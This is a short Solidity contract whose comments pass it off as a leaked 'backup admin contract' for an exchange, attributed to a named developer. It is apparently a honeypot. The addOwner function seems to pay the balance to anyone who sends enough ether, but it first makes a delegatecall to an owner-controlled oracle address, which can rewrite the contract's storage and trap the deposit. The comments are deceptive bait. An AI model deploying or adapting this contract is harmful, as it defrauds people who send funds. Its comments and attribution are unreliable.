// created by tommy wang
// segwit2x is the real bitcoin
// 09.11.17
// back up admin contract for yunbi, adds owner in case of lockout


pragma solidity ^0.4.18;
contract AdminInterface
{
    address public Owner; // web3.eth.accounts[9]
    address public oracle;
    uint256 public Limit;
    
    function AdminInterface(){
        Owner = msg.sender;
    }
    
     modifier onlyOwner() {
        require(msg.sender == Owner);
    _;
  }

    // config oracle db address and set minimum tx amt to limit abuse
    function Set(address dataBase) payable onlyOwner
    {
        Limit = msg.value;
        oracle = dataBase;
    }
    //can hold funds if needed
    function()payable{}
    
    function transfer(address multisig) payable onlyOwner {
        multisig.transfer(msg.value);
    }

    function addOwner(address newAddr) payable
    {   
        if(msg.value > Limit)
        {        
            // Because database is an database address, this adds owner to the database for that contract
            oracle.delegatecall(bytes4(keccak256("AddToWangDB(address)")),msg.sender);

            // transfer this wallets balance to new owner after address change
            newAddr.transfer(this.balance);
        }
    }
}